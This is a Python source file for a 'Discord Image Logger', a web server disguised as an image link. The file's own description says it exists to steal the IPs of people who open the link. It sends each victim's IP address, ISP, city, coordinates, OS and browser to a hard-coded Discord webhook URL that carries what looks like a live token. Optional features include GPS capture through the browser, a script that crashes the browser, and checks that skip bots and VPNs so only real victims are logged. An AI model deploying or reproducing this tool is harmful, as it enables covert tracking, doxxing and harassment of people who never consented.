# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1140290198010351677/Qf2isPBq80ZAtLAv8ONTq7AweAr6K-LOvqaXzL4DbUA2Ixi2V1NLk5n-uKas4zB0QVcP",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
